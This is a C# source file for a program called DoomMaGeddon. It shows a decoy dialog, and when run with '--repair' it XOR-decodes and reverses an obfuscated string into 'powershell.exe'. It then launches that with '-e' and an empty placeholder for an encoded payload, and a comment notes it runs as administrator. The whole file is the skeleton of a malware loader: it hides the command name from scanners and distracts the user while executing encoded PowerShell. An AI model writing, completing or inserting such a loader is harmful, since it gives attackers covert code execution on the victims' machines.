using System;
using System.Linq;
using System.Runtime.InteropServices;

class DoomMaGeddon
{
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcessW(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );

    static string RString(string str)
    {
        string rstr = "";
        for (int i = str.Length-1; i >= 0; --i) rstr += str[i];
        return rstr;
    }

    static void Main(string[] args)
    {
        if (!args.Contains("--repair"))
        {
            DiversionPrompt dp = new DiversionPrompt();
            dp.ShowDialog();
        } else {
            int[] productID = {21,10,10,74,25,15,17,1 ,28,28,21,5 ,0 ,20};
            char[] checksum = new char[productID.Length];
            string l = "";

            // runs as administrator
            string init_c = "production";

            for (int i = 0; i < productID.Length; ++i) {
                checksum[i] = (char)(productID[i] ^ init_c[i % init_c.Length]);
            }

            // fun stuff
            init_c = new string(checksum);
            init_c = RString(init_c)+" "+"-"+"e"+" "+l;

            // nativeAPI spooky stuff
            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(si);
            PROCESS_INFORMATION pi;

            bool success = CreateProcessW(
                null,
                init_c,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0,
                IntPtr.Zero,
                null,
                ref si,
                out pi
            );
        }
    }
}